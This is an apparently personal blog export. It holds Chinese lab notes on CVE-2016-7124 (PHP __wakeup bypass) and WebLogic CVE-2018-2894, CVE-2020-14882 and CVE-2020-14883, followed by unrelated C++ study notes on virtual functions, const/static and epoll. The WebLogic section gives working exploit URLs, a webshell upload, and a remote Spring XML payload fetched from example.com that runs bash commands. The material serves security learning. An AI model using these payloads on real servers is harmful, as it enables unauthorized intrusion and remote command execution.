    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>服务器：apache 2.4.39</p>
<p>PHP版本：5.3.29nts</p>
<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>PHP5 &lt; 5.6.25</p>
<p>PHP7 &lt; 7.0.10</p>
<h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>类中的wakeup()方法的绕过</p>
<h2 id="代码复现"><a href="#代码复现" class="headerlink" title="代码复现"></a>代码复现</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yuleiyun</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$target</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&quot;b&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	 <span class="variable language_">$this</span>-&gt;num=<span class="string">&quot;123&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;targer=<span class="string">&quot;10&quot;</span>;</span><br><span class="line">	   <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;num)||!<span class="variable language_">$this</span>-&gt;num)</span><br><span class="line">		   <span class="keyword">echo</span> <span class="string">&quot;you got it!&quot;</span>; </span><br><span class="line">	   <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;haha&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>逻辑为：destruct中的num值未设置或者为空时，才会有输出。</p>
<p>已知num这个值无法更改，所以尝试使num值未设置，则要绕过wakeup()。首先我们上传的参数要为序列化后的字符串：</p>
<p>如：</p>
<blockquote>
<p>?test&#x3D;O:8:”Yuleiyun”:2:{s:6:”target”;N;s:1:”b”;s:1:”b”;}</p>
<p>结果：</p>
<p>object(Yuleiyun)#1 (3) { [“target”]&#x3D;&gt; NULL [“b”]&#x3D;&gt; string(1) “b” [“num”]&#x3D;&gt; string(3) “123” } haha</p>
</blockquote>
<p>由于wakeup函数存在且比反序列化先触发，故，只要使得反序列化过程中的结构不匹配，导致 PHP 在反序列化时无法正确还原对象的结构，进而无法触发wakeup()方法。</p>
<p>如把成员数量由2改为3，不触发wakeup()，结果为</p>
<blockquote>
<p>?test&#x3D;O:8:”Yuleiyun”:3:{s:6:”target”;N;s:1:”b”;s:1:”b”;}</p>
<p>结果：</p>
<p>you got it!bool(false)</p>
</blockquote>
<h1 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h1><p>java中间件，端口为7001</p>
<p>默认后台登录地址<a href="http://ip:7001/console">http://ip:7001/console</a></p>
<h2 id="CVE-2018-2894-任意文件上传漏洞"><a href="#CVE-2018-2894-任意文件上传漏洞" class="headerlink" title="CVE-2018-2894(任意文件上传漏洞)"></a>CVE-2018-2894(任意文件上传漏洞)</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>后台页面，点击<code>base_domain</code>的配置，在“高级”中开启“启用 Web 服务测试页”选项</p>
<p>hrrp:&#x2F;&#x2F;ip:7001&#x2F;console&#x2F;login&#x2F;LoginForm.jsp</p>
<p><img src="/../../../Typora/img111/image-20230722141302907.png"></p>
<p>不用登陆，直接url访问:7001&#x2F;ws_utc&#x2F;config.do</p>
<p>来到后台，设置路径，该路径可以无权限访问</p>
<blockquote>
<p>&#x2F;u01&#x2F;oracle&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;com.oracle.webservices.wls.ws-testclient-app-wls&#x2F;4mcj4y&#x2F;war&#x2F;css</p>
</blockquote>
<p><img src="/../../../Typora/img111/image-20230722141517874.png"></p>
<p><img src="/../../../Typora/img111/image-20230722142032194.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sat, 22 Jul 2023 06:38:32 GMT</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: 333</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;setting id=&quot;security&quot;&gt;&lt;section name=&quot;key_store_list&quot;&gt;&lt;options xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:type=&quot;securityOptions&quot;&gt;&lt;keyStoreItem&gt;&lt;id&gt;1690007912011&lt;/id&gt;&lt;name&gt;123&lt;/name&gt;&lt;keyStore&gt;shell.jsp&lt;/keyStore&gt;&lt;password&gt;123&lt;/password&gt;&lt;/keyStoreItem&gt;&lt;/options&gt;&lt;/section&gt;&lt;/setting&gt;</span><br></pre></td></tr></table></figure>

<p>抓响应包，或者f12，发现有一个时间戳，可以构造路径</p>
<p><a href="http://you-ip/ws_utc/css/config/keystore/[%E6%97%B6%E9%97%B4%E6%88%B3]_[%E6%96%87%E4%BB%B6%E5%90%8D]">http://you-ip/ws_utc/css/config/keystore/[时间戳]_[文件名]</a></p>
<p><a href="http://eci-2ze5qymq43f2pcf4bh8r.cloudeci1.ichunqiu.com:7001/ws_utc/css/config/keystore/1690023268535_shell.jsp">http://eci-2ze5qymq43f2pcf4bh8r.cloudeci1.ichunqiu.com:7001/ws_utc/css/config/keystore/1690023268535_shell.jsp</a></p>
<p>然后嘞，网页访问下这个路径，执行.jsp</p>
<p>蚁剑连接</p>
<p>哦豁，没连上</p>
<p>下载冰蝎，生成一个jsp木马，默认密码rebeyond</p>
<p>状态明明是绿色，点进去失败，也没用，算了</p>
<p>我生气啦。</p>
<p>说是还有&#x2F;ws_utc&#x2F;begin.do</p>
<p><img src="/../../../Typora/img111/image-20230722190514604.png" alt="image-20230722190514604"></p>
<p>上报出错，查看回显日志，但是是传进去了</p>
<p>看响应包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">encoding=&quot;UTF-8&quot;?&gt;&lt;errorMsgBean&gt;&lt;title&gt;Web服务测试运行期错误&lt;/title&gt;&lt;desc&gt;导入测试错误&lt;/desc&gt;&lt;details&gt;com.oracle.webservices.testclient.exception.WSTestRuntimeException: javax.xml.bind.UnmarshalException</span><br><span class="line"> - with linked exception:</span><br><span class="line">[Exception [EclipseLink-25004] (Eclipse Persistence Services - 2.5.2.v20140319-9ad6abd): org.eclipse.persistence.exceptions.XMLMarshalException</span><br><span class="line">Exception Description: An error occurred unmarshalling the document</span><br><span class="line">Internal Exception: org.xml.sax.SAXParseException; systemId: file:/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css/upload/RS_Upload_2023-07-22_11-06-26_875/import_file_name_shell.jsp; lineNumber: 1; columnNumber: 2; The markup in the document preceding the root element must be well-formed.]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css/upload/RS_Upload_2023-07-22_11-06-26_875/import_file_name_shell.jsp   //给了路径</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2020-14882"><a href="#CVE-2020-14882" class="headerlink" title="CVE-2020-14882"></a>CVE-2020-14882</h2><p>允许未授权的用户绕过管理控制台的权限验证访问后台</p>
<h2 id="CVE-2020-14883"><a href="#CVE-2020-14883" class="headerlink" title="CVE-2020-14883"></a>CVE-2020-14883</h2><p>允许后台任意用户通过HTTP协议执行任意命令</p>
<h2 id="Weblogic-管理控制台未授权远程命令执行漏洞"><a href="#Weblogic-管理控制台未授权远程命令执行漏洞" class="headerlink" title="(Weblogic 管理控制台未授权远程命令执行漏洞)"></a>(Weblogic 管理控制台未授权远程命令执行漏洞)</h2><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><p>首先是cve-2020-14882</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://your-ip:7001/console/css/%252e%252e%252fconsole.portal</span><br></pre></td></tr></table></figure>

<p>可以通过未授权访问到管理页面</p>
<p>安装应用等功能时，会有消息提示，权限不足</p>
<p>cve-2020-14883的利用方式有二种：</p>
<p>1是：<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>Weblogic 12.2.1以上版本利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#x27;touch%20/tmp/success1&#x27;);&quot;)</span><br></pre></td></tr></table></figure>

<p>2是：<code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code>对于所有Weblogic版本均有效</p>
<p>构造XML文件，保存到在Weblogic可以访问到的服务器上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">   xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">   xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line">    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;</span><br><span class="line">        &lt;constructor-arg&gt;</span><br><span class="line">          &lt;list&gt;</span><br><span class="line">            &lt;value&gt;bash&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;-c&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;&lt;![CDATA[touch /tmp/success2]]&gt;&lt;/value&gt;</span><br><span class="line">          &lt;/list&gt;</span><br><span class="line">        &lt;/constructor-arg&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>

<p>访问以下url，让weblogic加载该xml，执行其中命令(需要Weblogic的服务器能够访问到恶意XML)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://example.com/rce.xml&quot;)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>weblogic</tag>
      </tags>
  </entry>
  <entry>
    <title>C++知识点</title>
    <url>/2023/08/03/C/</url>
    <content><![CDATA[<h1 id="基础知识点"><a href="#基础知识点" class="headerlink" title="基础知识点"></a>基础知识点</h1><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230804173925602.png" alt="指针与变量"></p>
<p>无论是int *p，还是void *p，不会对存储的值有影响</p>
<p>但是嘞，如果要存储整形数字的话，是需要声明类型的，比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void *p=&amp;a;</span><br><span class="line">*p=8; //这就会报错</span><br><span class="line"></span><br><span class="line">所以是</span><br><span class="line">int *p=&amp;a;</span><br><span class="line">*p=8;</span><br></pre></td></tr></table></figure>

<p>这就是指针的工作原理</p>
<p>看下，下面这个，分配内存</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;string.h&gt;</span><br><span class="line">...</span><br><span class="line">int main()&#123;</span><br><span class="line">	</span><br><span class="line">	char *buffer=new char[8];</span><br><span class="line">	memset(buffer,1,8);//将内存的内容设置为指定值</span><br><span class="line">	</span><br><span class="line">	//delete[] buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230804180029168.png" alt="分配8个字节内存"></p>
<p>开辟了8个字节，存储了一个指向该数据开头的指针</p>
<p>双指针嘞，那值就变成地址了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char *buffer=new char[8];</span><br><span class="line">	memset(buffer,1,8);</span><br><span class="line"></span><br><span class="line">	char** ptr=&amp;buffer;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230804181127018.png" alt="双指针"></p>
<p>在十六进制表示中<code>0x1c7080</code>，<strong>左</strong>侧是<strong>最高</strong>有效字节（MSB），<strong>右</strong>侧是<strong>最低</strong>有效字节（LSB）。</p>
<p>大端：高地址存低字节，(人类的顺序)</p>
<p>小端：低地址存低字节 </p>
<p>堆中的变量(程序员自己new或malloc的)：分配的内存一般是按照地址递增的顺序存储的。堆往高地址生长，先声明的变量位于低地址</p>
<p>栈中的变量：栈往低地址生长，先声明的变量位于高地址</p>
<h1 id="1-虚函数"><a href="#1-虚函数" class="headerlink" title="1.虚函数"></a>1.虚函数</h1><p><code>virtual 类型 成员函数名 (参数表);</code></p>
<p>虚函数必须存在于类的继承环境中才有意义</p>
<p>存在虚函数的类都有一个一维的虚函数表叫虚表，类的对象有一个指向虚表开始的虚指针，占4&#x2F;8字节；</p>
<p>虚表与类对应；虚表指针和对象对应</p>
<p>定义一个函数为虚函数，是为了允许基类指针调用子类的这个函数</p>
<h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>不同<strong>对象</strong>调用相同的<strong>函数</strong>，但呈现多样的<strong>结果</strong></p>
<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="编译时多态"><a href="#编译时多态" class="headerlink" title="编译时多态"></a>编译时多态</h4><p>编译过程中静态确定同名操作与具体对象绑定的关系（函数重载、运算符重载、模板）</p>
<p>优点：程序运行时函数调用速度快、效率高</p>
<p>缺点：编程不灵活</p>
<h4 id="运行时多态"><a href="#运行时多态" class="headerlink" title="运行时多态"></a>运行时多态</h4><p>动态确定同名操作与具体对象绑定的关系（继承和虚函数）</p>
<p>优点：编程更加灵活、系统易于扩展</p>
<p>缺点：调用速度比静态绑定的函数慢</p>
<p><strong>条件：</strong></p>
<p><code>1.有虚函数；</code></p>
<p><code>			2.符合赋值兼容规则；</code></p>
<p><code>3.由指针或引用去调用虚函数</code></p>
<h5 id="如果不用虚函数"><a href="#如果不用虚函数" class="headerlink" title="如果不用虚函数"></a>如果不用虚函数</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class test1&#123;</span><br><span class="line">protected:</span><br><span class="line">    int b;</span><br><span class="line">public:</span><br><span class="line">    test1(int v):b(v) &#123;&#125;</span><br><span class="line">  //  virtual void eat()=0;</span><br><span class="line">    void eat()&#123;</span><br><span class="line">        cout&lt;&lt;&quot;test1&quot;&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">class him:public test1&#123;</span><br><span class="line">public:</span><br><span class="line">    him():test1(0)&#123;&#125;</span><br><span class="line">    // virtual void eat() override&#123;</span><br><span class="line">    //     cout&lt;&lt;&quot;him,&quot;&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">    // &#125;</span><br><span class="line">    void eat() &#123;</span><br><span class="line">        cout&lt;&lt;&quot;him,&quot;&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">class you:public test1&#123;</span><br><span class="line">private:</span><br><span class="line">    int c;</span><br><span class="line">public:</span><br><span class="line">    you():test1(1),c(2)&#123;&#125;</span><br><span class="line">    // virtual void eat() override&#123;</span><br><span class="line">    //     cout&lt;&lt;&quot;you,&quot;&lt;&lt;c&lt;&lt;endl;</span><br><span class="line">    // &#125;</span><br><span class="line">    void eat() &#123;</span><br><span class="line">        cout&lt;&lt;&quot;you,&quot;&lt;&lt;c&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">    you* pyou=new you();</span><br><span class="line">    him* phim=new him();</span><br><span class="line"></span><br><span class="line">	//基类的指针指向派生类的对象</span><br><span class="line">    test1* eater1=(test1*)pyou;</span><br><span class="line">    test1* eater2=(test1*)phim;</span><br><span class="line"></span><br><span class="line">    eater2-&gt;eat();</span><br><span class="line">    eater1-&gt;eat();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>test1<br>test1</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">using namespace std;</span><br><span class="line">class test1&#123;</span><br><span class="line">protected:</span><br><span class="line">    int b;</span><br><span class="line">public:</span><br><span class="line">    test1(int v):b(v) &#123;&#125;</span><br><span class="line">    virtual void eat()=0;</span><br><span class="line">&#125;;</span><br><span class="line">class him:public test1&#123;</span><br><span class="line">public:</span><br><span class="line">    him():test1(0)&#123;&#125;</span><br><span class="line">    virtual void eat() override&#123;</span><br><span class="line">        cout&lt;&lt;&quot;him,&quot;&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">class you:public test1&#123;</span><br><span class="line">private:</span><br><span class="line">    int c;</span><br><span class="line">public:</span><br><span class="line">    you():test1(1),c(2)&#123;&#125;</span><br><span class="line">    virtual void eat() override&#123;</span><br><span class="line">        cout&lt;&lt;&quot;you,&quot;&lt;&lt;c&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">    you* pyou=new you();</span><br><span class="line">    him* phim=new him();</span><br><span class="line">	</span><br><span class="line">	//基类的指针指向派生类的对象</span><br><span class="line">    test1* eater1=(test1*)pyou;</span><br><span class="line">    test1* eater2=(test1*)phim;</span><br><span class="line">	</span><br><span class="line">	//相同结果</span><br><span class="line">	 // you pyou;</span><br><span class="line">    // him phim;</span><br><span class="line"></span><br><span class="line">    // test1* eater1= &amp;pyou;</span><br><span class="line">    // test1* eater2= &amp;phim;</span><br><span class="line">	</span><br><span class="line">    eater2-&gt;eat();// 调用 him 类的 eat() 函数</span><br><span class="line">    eater1-&gt;eat();//// 调用 you 类的 eat() 函数</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>him,0<br>you,2</p>
</blockquote>
<p><code>有了虚函数</code>，<strong>指定哪个对象，就调用哪个函数的方法</strong></p>
<p>类-&gt;内存对象-&gt;虚函数表</p>
<p>PS:那个override可写可不写，c++11提出的，为了增加可读性</p>
<p>​	<strong>基类函数写了virtual，派生类就不需要写了，重写一遍函数就行了</strong></p>
<h2 id="析构函数"><a href="#析构函数" class="headerlink" title="析构函数"></a>析构函数</h2><p>指在delete对象指针的时候，调用的函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Base *bp;</span><br><span class="line"></span><br><span class="line">bp=new derived();//Base的派生</span><br><span class="line"></span><br><span class="line">delete bp;</span><br></pre></td></tr></table></figure>

<p>如果基类没有加virtual，delete时只返回基类的析构</p>
<p>如果基类加了virtual，派生的析构可不加，delete时返回基类+派生的析构</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="纯虚函数"><a href="#纯虚函数" class="headerlink" title="纯虚函数"></a>纯虚函数</h3><p>而且基类一般不需要实现virtual 函数，它只为派生提供一个接口，只用提供函数名，而不实现函数体，即为<strong>纯虚函数</strong> ：<code>virtual void eat()=0;</code>(声明语句，而不能被调用)</p>
<p>有<strong>纯虚函数</strong>的类叫做<strong>抽象类</strong>，不能实例化一个抽象类的对象，所以会报错，因为没有具体的功能实现</p>
<p>如果其派生类也不实现同名函数的话（比如，直接不写eat()函数）也会报错的。</p>
<p><strong>纯虚函数</strong>的优点就是可以防止派生类忘记实现虚函数</p>
<h3 id="虚函数"><a href="#虚函数" class="headerlink" title="虚函数"></a>虚函数</h3><p>虚函数的使用：</p>
<p>第一步，基类，声明某个基类函数为virtual</p>
<p>第二步。派生类，定义在基类的virtual函数</p>
<p>第三步，声明基类指针，指向派生类，调用virtual函数</p>
<p> 虚函数（Virtual Function）是通过一张虚函数表（Virtual Table） 来实现的。简称为 V-Table 。在这个表中，主是要一个类的虚 函数的地址表，这张表解决了继承、覆盖的问题，保证其容 真实反应实际的函数。</p>
<h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p>在面向对象程序设计中，创建一个只包含未实现方法然后交由子类去实际实现功能的类是非常普遍的,这通常被称为<strong>接口</strong>。<strong>接口就是一个只包含未实现的方法并作为一个模板的类</strong>。并且由于此<strong>接口类</strong>实际上不包含方法实现，所以我们<strong>无法实例化</strong>这个类。</p>
<p>比如来个打印类名的方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class printable&#123;//接口，就纯模板</span><br><span class="line">public:</span><br><span class="line">    virtual string printclass()=0;</span><br><span class="line">&#125;;</span><br><span class="line">//基类</span><br><span class="line">class entity:public printable&#123;</span><br><span class="line">public:</span><br><span class="line">    virtual string getname()&#123;return &quot;entity&quot;;&#125;</span><br><span class="line">     string printclass()  &#123;return &quot;entity&quot;;&#125;//实现接口的纯需函数</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line">//派生类</span><br><span class="line">class player:public entity&#123;//继承entity，entity已有接口</span><br><span class="line">private:</span><br><span class="line">    string pname;</span><br><span class="line">public:</span><br><span class="line">    player(const string&amp; name):pname(name)&#123;&#125;</span><br><span class="line">     string getname()  &#123;return pname;&#125;</span><br><span class="line">     string printclass()  &#123;return &quot;player&quot;;&#125;//实现接口的纯虚函数</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void print(printable *obj)&#123;//为了输出返回值为string类型的函数，它接收printable对象，不关心什么类</span><br><span class="line">    cout&lt;&lt;obj-&gt;printclass()&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    entity* e=new entity();</span><br><span class="line">   // player* p=new player(&quot;132&quot;);</span><br><span class="line">   entity*p =new player(&quot;132&quot;);</span><br><span class="line">    print(e);</span><br><span class="line">    print(p);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>entity<br>player</p>
</blockquote>
<p>PS:如果player不继承entity</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class player : public Otherclass,printable&#123;</span><br><span class="line">	...</span><br><span class="line">	string pintclass() &#123;return &quot;player&quot;;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这个就体现了下接口。</p>
<p>当然啊，如果还是看虚函数的话</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//基类</span><br><span class="line">class entity:public printable&#123;</span><br><span class="line">public:</span><br><span class="line">     //virtual string getname()&#123;return &quot;entity&quot;;&#125;</span><br><span class="line">     string getname()&#123;return &quot;entity&quot;;&#125;</span><br><span class="line">     string printclass()  &#123;return &quot;entity&quot;;&#125;//实现接口的纯需函数</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line">...</span><br><span class="line">   entity* e=new entity();</span><br><span class="line">   // player* p=new player(&quot;132&quot;);</span><br><span class="line">    entity*p =new player(&quot;132&quot;);</span><br><span class="line">    // print(e);</span><br><span class="line">    // print(p);</span><br><span class="line">    cout&lt;&lt;e-&gt;getname();</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;p-&gt;getname();</span><br></pre></td></tr></table></figure>

<blockquote>
<p>entity<br>entity</p>
</blockquote>
<p>但是：基类函数加了virtual后嘞</p>
<blockquote>
<p>entity<br>132</p>
</blockquote>
<h1 id="2-C-中-const、define、static-的区别？"><a href="#2-C-中-const、define、static-的区别？" class="headerlink" title="2.C++中 const、define、static 的区别？"></a>2.C++中 const、define、static 的区别？</h1><h3 id="const"><a href="#const" class="headerlink" title="const"></a>const</h3><p><strong>const</strong> 是单词 constant 的简写，字面意思是<strong>常数</strong>、常量。 用于变量修饰，表明这个变量<strong>不能被修改</strong>；(mutable就是可改)</p>
<p>用于指针修饰， 表明指针的指向物<strong>不能被修改</strong>；</p>
<p>用于方法修饰，表明这个方法<strong>不会</strong>对对象造成改变。 </p>
<p>const修饰指针时，cosnt位置不同，那么修饰对象不同</p>
<p>int *const p2中 const修饰的是p2的值，即该指针p2的指向不可变，但*p2可读取该指向的变量值</p>
<p>int const *p1与const int *p1中，const修饰*p1，即*p1的值不可改变，但可以更改p1的指向</p>
<p>底层指针：指示<strong>指针所指向的变量</strong>是一个<strong>常量</strong></p>
<h3 id="define"><a href="#define" class="headerlink" title="define"></a>define</h3><p><strong>#define</strong> 和另外两个不一样，它属于<strong>宏</strong>，是预处理器的一部分。</p>
<p> 预处理是在编译之前的一道，简单地进行字符串替换，它不按照语言的语法，而是直管自己的语法。</p>
<p>定义的常量没有类型；而const定义的常量有类型名字，且放在静态区域</p>
<p>#define定义的常量不可以用指针指向；const可以</p>
<p>#define可以定义简单的函数，const不可以定义函数	</p>
<h3 id="static"><a href="#static" class="headerlink" title="static"></a>static</h3><p> <strong>static</strong> 的定义相对较复杂，用在<strong>全局变量</strong>表明这个变量在每个编译单元有独自的实例；</p>
<p>用在函数里的<strong>局部变量</strong>，表明它的生存周期其实是全局变量，但仅在函数内可见；(可用来统计函数调用次数)</p>
<p>用在<strong>类成员</strong>，表明成员或者方法是类的，而不是对象实例的。</p>
<p>静态成员不占用类的大小，普通函数也不占用</p>
<h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><ul>
<li>隐藏：当同时编译多个文件时，所有未加static前缀的全局变量和函数都具有全局可见性</li>
<li>保持变量内容的持久：存储在静态数据 区的变量会在程序刚开始运行时就完成初始化，也是唯一的一次初始化。</li>
<li>默认初始化为0（static变量）；全局变量也具备这一属性，因为全局变量也存储在静态数据区。</li>
<li>c++类成员声明：<ul>
<li>函数体内static变量的作用范围为该函数体</li>
<li>模块内的static<strong>全局变量</strong>可以被<strong>模块内所用函数</strong>访问，但不能被模块外其它函数访问</li>
<li>在模块内的static<strong>函数</strong>只可被这一<strong>模块内的其它函数调用</strong>，这个函数的使用范围被限制在声明它的模块内；</li>
<li>static成员函数不能被virtual修饰，static成员不属于任何对象或实例，所以加上virtual没有任何实际意义；</li>
</ul>
</li>
</ul>
<h1 id="3-对于epoll底层结构和原理有什么了解？"><a href="#3-对于epoll底层结构和原理有什么了解？" class="headerlink" title="*3. 对于epoll底层结构和原理有什么了解？"></a>*3. 对于epoll底层结构和原理有什么了解？</h1><p>这啥啊Σ(⊙▽⊙”a</p>
<p>eventpoll的使用中，经常需要对文件描述符集合进行添加、删除等操作，同时对触发的事件类型进行处理，回调IO事件中的工作函数。</p>
<p>epoll,<strong>I&#x2F;O多路复用技术</strong>，最大特点是<strong>支持高并发</strong>，从linux内核2.6引入的</p>
<p>头文件<code>#include &lt;sys/epoll.h&gt;</code></p>
<p>三个关键函数</p>
<blockquote>
<p>创建 eventpoll 对象</p>
<p>int epoll_create(int size); </p>
<p>操作 eventpoll 对象</p>
<p>int epoll_ctl(int epfd, int op, int fd, struct epoll_events* event);</p>
<p>从 eventpoll 对象中返回活跃的事件。</p>
<p>int epoll_wait(int epfd, struct epoll_event* events, int maxevents, int timeout);</p>
</blockquote>
<h3 id="epoll-create"><a href="#epoll-create" class="headerlink" title="epoll_create;"></a>epoll_create;</h3><blockquote>
<ul>
<li>功能：创建一个epoll对象，返回该对象的描述符【文件描述符】，这个描述符就代表这个epoll对象，后续会用到。</li>
<li>这个epoll对象最终要用close()，因为文件描述符&#x2F;句柄 总是关闭的。</li>
<li>size &gt; 0;。</li>
</ul>
</blockquote>
<h3 id="epoll-ctl"><a href="#epoll-ctl" class="headerlink" title="epoll_ctl"></a>epoll_ctl</h3><blockquote>
<ul>
<li>功能：把一个socket以及这个socket相关的事件添加到这个epoll对象描述符中去，目的就是通过这个epoll对象来监视这个socket【客户端的TCP连接】上数据的来往情况；当有数据来往时，系统会通知我们。</li>
<li>我们把感兴趣的事件通过 epoll_ctl()  添加到系统，当这些事件来的时候，系统会通知我们。</li>
<li>efpd：epoll_create()返回的epoll对象描述符</li>
<li>op：动作，添加&#x2F;删除&#x2F;修改 ，对应数字是1,2,3， EPOLL_CTL_ADD, EPOLL_CTL_DEL ,EPOLL_CTL_MOD</li>
